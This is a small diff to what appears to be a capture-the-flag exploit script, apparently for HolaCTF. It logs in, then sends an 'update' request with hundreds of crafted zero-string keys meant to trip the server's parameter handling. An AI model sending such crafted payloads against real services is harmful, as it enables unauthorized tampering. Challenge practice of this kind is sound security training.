@@ -9,7 +9,7 @@ login = s.post(url, data=data)
 payload={}
 
 for i in range(1, 512):
-    payload["0"*(i+1)] = "proochicken"
+    payload["0"*i] = "proochicken"
 payload["1"] = "Holactf"
 
 endpoint = "update"
